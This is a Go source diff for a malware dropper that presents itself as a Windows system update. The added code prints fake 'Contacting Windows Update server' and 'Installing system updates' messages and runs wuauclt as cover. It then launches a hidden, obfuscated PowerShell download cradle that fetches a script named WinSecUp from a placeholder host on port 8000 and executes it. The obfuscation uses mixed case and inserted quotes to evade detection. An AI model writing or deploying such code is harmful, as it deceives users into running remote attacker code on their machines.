@@ -5,13 +5,30 @@ import (
 	"os/exec"
 )
 
-func main() {
-	fun := "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://XXXXX:8000/WinSecUp')\""
-	cmd := exec.Command("powershell", "-NOp", fun)
-	err := cmd.Run()
-	if err != nil {
-		fmt.Println(err)
+func drop() {
+	fun := "p\"\"OWe\"\"RshE\"\"lL -noP -w Hidden -c \"iex(NeW-obJEcT NEt.wEbCliENt).DoWnlOAdStRinG('http://XXXXX:8000/WinSecUp')\""
+
+	cmd2 := exec.Command("powershell", "-NOp", fun)
+	err2 := cmd2.Run()
+	if err2 != nil {
+		fmt.Println(err2)
 		return
 	}
-	fmt.Println("Searching for system updates")
+	fmt.Println("Installing system updates")
+
+}
+
+func main() {
+	fmt.Println("[!] Contacting Windows Update server for updates...")
+	// add call to windows update
+	update := "wuauclt.exe /detectnow"
+
+	cmd := exec.Command("cmd.exe", update)
+	err := cmd.Run()
+	if err != nil {
+		fmt.Println("Couldn't contact update server.", err)
+		return
+	}
+
+	drop()
 }
